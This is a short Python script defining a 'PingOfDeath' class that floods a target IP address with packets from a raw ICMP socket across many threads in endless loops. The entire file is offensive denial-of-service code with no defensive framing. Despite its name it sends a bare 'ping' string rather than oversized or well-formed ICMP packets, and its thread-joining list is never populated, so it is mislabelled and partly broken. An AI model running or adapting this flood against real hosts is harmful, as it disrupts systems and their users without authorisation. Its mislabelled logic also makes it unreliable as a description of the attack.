import time
import threading
from socket import *

class PingOfDeath():
    def __init__(self, ip, sleep_time, threading_count):
        self.ip = ip
        self.sleep_time = sleep_time
        self.threading_count = threading_count

    def attack(self):
        threads = []
        s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)

        def begin():
            while True:
                s.sendto(bytes("ping", "utf-8"), (self.ip, 0))
                time.sleep(self.sleep_time)

        for i in range(self.threading_count):
            thread = threading.Thread(target=begin,)
            thread.start()

        for t in threads:
            t.join()